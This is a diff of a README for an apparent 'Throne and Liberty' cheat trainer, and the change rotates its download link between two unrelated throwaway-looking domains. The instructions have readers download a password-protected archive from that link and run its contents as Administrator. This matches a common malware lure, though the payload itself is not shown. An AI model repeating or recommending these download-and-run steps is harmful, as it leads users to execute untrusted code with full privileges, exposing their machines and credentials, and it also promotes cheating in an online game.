@@ -6,7 +6,7 @@ Throne and Liberty trainer with unlimited HP, mana, gold, cooldown reset, zoom h
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on community tools like **Trainer Plus**, **CE Cheat Tables**, and **Direc
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch Throne and Liberty.
 4. Run the trainer **as Administrator**.
